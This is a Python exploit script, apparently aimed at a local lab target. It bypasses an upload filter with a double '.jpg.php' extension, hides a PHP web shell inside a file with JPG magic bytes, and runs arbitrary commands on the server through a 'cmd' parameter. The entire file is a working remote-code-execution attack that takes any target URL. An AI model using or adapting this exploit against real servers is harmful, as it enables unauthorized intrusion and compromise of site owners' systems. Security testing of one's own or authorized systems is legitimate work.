#!/usr/bin/env python3
"""
Arbitrary File Upload to RCE via Double Extension Bypass
Vulnerability: File upload with JPG magic bytes but .jpg.php extension executes as PHP

Target: http://localhost:8080/
Attack: Upload polyglot JPG file with .jpg.php extension
Result: Remote Code Execution as www-data
"""

import requests
import io
import re
import sys

def create_payload(php_code):
    """Create a polyglot JPG file with embedded PHP"""
    jpg_data = bytearray()
    # JFIF JPG magic bytes and header
    jpg_data.extend(b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')
    # PHP code
    jpg_data.extend(php_code.encode() if isinstance(php_code, str) else php_code)
    # JPG end marker
    jpg_data.extend(b'\xFF\xD9')
    return bytes(jpg_data)

def exploit(target_url, command=None):
    """Exploit the upload vulnerability"""
    
    # PHP payload for RCE
    php_code = '<?php system($_GET["cmd"]); ?>'
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload: {php_code}")
    
    # Create polyglot JPG payload
    payload = create_payload(php_code)
    
    # Upload with double extension
    print("[*] Uploading file with double extension (.jpg.php)...")
    files = {'userfile': ('shell.jpg.php', io.BytesIO(payload), 'image/jpeg')}
    data = {'submit': 'Upload Image'}
    
    response = requests.post(f'{target_url}/index.php', files=files, data=data)
    
    # Extract upload path
    match = re.search(r"href=['\"]([^'\"]*\.jpg\.php)['\"]", response.text)
    if not match:
        print("[-] Upload failed or file not saved as .jpg.php")
        return False
    
    upload_path = match.group(1)
    print(f"[+] File uploaded to: {upload_path}")
    
    # Test RCE
    rce_url = f'{target_url}/{upload_path}'
    print(f"[*] RCE URL: {rce_url}?cmd=COMMAND")
    
    if command:
        print(f"[*] Executing command: {command}")
        exec_response = requests.get(rce_url, params={'cmd': command})
        
        if 'uid=' in exec_response.text or 'root' in exec_response.text:
            print("[+] RCE SUCCESSFUL!")
            # Extract output
            output_lines = exec_response.text.split('\n')
            for line in output_lines:
                if 'uid=' in line or 'gid=' in line or 'groups=' in line:
                    print(f"[+] {line.strip()}")
            return True
    else:
        # Test with 'id' command
        test_response = requests.get(rce_url, params={'cmd': 'id'})
        if 'uid=' in test_response.text:
            print("[+] RCE SUCCESSFUL!")
            print(f"[+] Test command output found")
            return True
    
    return False

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:8080'
    cmd = sys.argv[2] if len(sys.argv) > 2 else None
    
    exploit(target, cmd)
